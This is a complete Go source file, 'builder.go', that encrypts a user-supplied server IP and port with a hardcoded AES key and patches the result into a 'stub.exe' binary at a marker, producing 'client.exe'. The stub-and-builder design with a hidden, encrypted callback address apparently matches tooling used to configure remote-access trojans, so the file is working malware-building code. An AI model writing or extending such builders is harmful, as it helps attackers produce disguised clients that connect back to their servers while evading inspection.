package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"flag"
	"fmt"
	"os"
	"strconv"
)

const (
	ConfigKey    = "B4A7E9C2D5F8A1B3C6E9D2F5A8B1C4D7"
	ConfigIV     = "A1B2C3D4E5F6A7B8"
	ResourceSize = 2048
	MarkerSize   = 16
	ConfigSize   = ResourceSize - MarkerSize
)

var Marker = []byte{0xDE, 0xAD, 0xBE, 0xEF, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xAA, 0xBB, 0xCC}

type Config struct {
	IP   string `json:"ip"`
	Port int    `json:"port"`
}

func main() {
	var ip string
	var port int

	// Support both flags and positional arguments
	flag.StringVar(&ip, "ip", "", "Server IP address")
	flag.IntVar(&port, "port", 0, "Server Port")
	flag.Parse()

	args := flag.Args()
	if ip == "" && len(args) > 0 {
		ip = args[0]
	}
	if port == 0 && len(args) > 1 {
		p, err := strconv.Atoi(args[1])
		if err == nil {
			port = p
		}
	}

	if ip == "" || port == 0 {
		fmt.Println("Usage: go run builder.go <ip> <port>")
		fmt.Println("   or: go run builder.go -ip <ip> -port <port>")
		os.Exit(1)
	}

	// 1. Create JSON config string manually to avoid extra dependencies if possible
	// but using encoding/json is standard and safer.
	importJSON := fmt.Sprintf(`{"ip":"%s","port":%d}`, ip, port)
	confBytes := []byte(importJSON)

	// 2. Pad to ConfigSize with zeros
	paddedConf := make([]byte, ConfigSize)
	copy(paddedConf, confBytes)

	// 3. Encrypt
	encryptedConf, err := aesEncrypt(paddedConf, []byte(ConfigKey), []byte(ConfigIV))
	if err != nil {
		fmt.Printf("Encryption error: %v\n", err)
		os.Exit(1)
	}

	// 4. Read stub.exe
	binaryData, err := os.ReadFile("stub.exe")
	if err != nil {
		fmt.Printf("Error reading stub.exe: %v\n", err)
		os.Exit(1)
	}

	// 5. Find marker and patch
	index := bytes.Index(binaryData, Marker)
	if index == -1 {
		fmt.Println("Error: Marker not found in stub.exe")
		os.Exit(1)
	}

	// Patch: marker is followed by ConfigSize bytes
	// We make a copy to avoid modifying original slice if needed, but here we write directly
	patchedData := make([]byte, len(binaryData))
	copy(patchedData, binaryData)
	copy(patchedData[index+MarkerSize:], encryptedConf)

	// 6. Save as client.exe
	err = os.WriteFile("client.exe", patchedData, 0755)
	if err != nil {
		fmt.Printf("Error writing client.exe: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("Successfully built client.exe with IP: %s, Port: %d\n", ip, port)
}

func aesEncrypt(data, key, iv []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	mode := cipher.NewCBCEncrypter(block, iv)
	encrypted := make([]byte, len(data))
	mode.CryptBlocks(encrypted, data)

	return encrypted, nil
}
